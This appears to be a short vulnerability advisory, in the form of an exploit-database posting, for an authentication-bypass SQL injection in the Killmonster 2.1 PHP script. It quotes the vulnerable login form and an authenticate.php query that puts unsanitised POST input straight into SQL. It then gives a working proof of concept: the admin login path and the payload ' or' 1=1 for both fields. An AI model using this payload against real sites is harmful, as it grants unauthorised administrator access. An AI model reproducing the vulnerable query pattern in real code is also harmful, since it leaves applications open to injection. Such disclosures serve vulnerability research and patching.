@@ -1,0 +1,29 @@
+[+] Killmonster <= 2.1 (Auth Bypass) SQL Injection Vulnerability
+[+] Discovered by cr4wl3r <cr4wl3r[!]linuxmail.org>
+[+] Download : http://scripts.ringsworld.com/games-and-entertainment/km2/
+
+
+[+] Vuln Code : 
+
+[login.php]
+
+<form method="POST" action="authenticate.php">
+Type Username Here: <input type="text" name="isadmin" size="15"><br>
+Type Password Here: <input type="password" name="password" size="15" mask="x"><br>
+<input type="submit" value="submit" name="submit">
+
+[authenticate.php]
+
+    $isadmin=$_POST['isadmin'];
+    $password=$_POST['password'];
+    $password=md5($password);
+    $query = "select * from km_admins where username='$isadmin' and password='$password'"; 
+    $result = mysql_query($query) ;
+
+
+
+
+[+] PoC : [Killmonster_path]/admin/login.php
+
+username :  ' or' 1=1
+password :  ' or' 1=1
